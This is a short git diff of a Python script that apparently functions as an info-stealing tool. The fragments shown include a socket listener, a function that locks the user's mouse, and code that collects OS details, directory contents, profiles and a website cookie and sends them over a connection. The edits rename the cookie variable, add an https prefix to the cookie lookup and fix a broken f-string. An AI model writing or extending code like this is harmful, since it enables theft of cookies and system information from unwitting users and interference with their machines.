@@ -20,7 +20,7 @@ blink = "\033[5m"
 
 HOST = "" # your local ip address
 PORT = 80
-website_coockie = "
+website_coockie_to_get = ""
 time_mouse_locked = 100
 mouse_pos_x = 0
 mouse_pos_y = 0
@@ -45,7 +45,7 @@ def lock_mouse(X, Y, time_in_milliseconds):
 def listen_for_host(host,port):
     address = (host,port)
     print(f"Getting information...")
-    get_os_info(website_coockie)
+    get_os_info("https://" + website_coockie_to_get)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.bind(address)
@@ -66,7 +66,7 @@ def listen_for_host(host,port):
             directory contents: {info_list[4]}\n\
             profiles: {info_list[5]}\n\
             api version: {info_list[6]}\n\
-            coockie: {info_list{7}\n}"
+            coockie: {info_list[7]}\n"
 
     conn.send(f"\n{msg}".encode())
     conn.close()
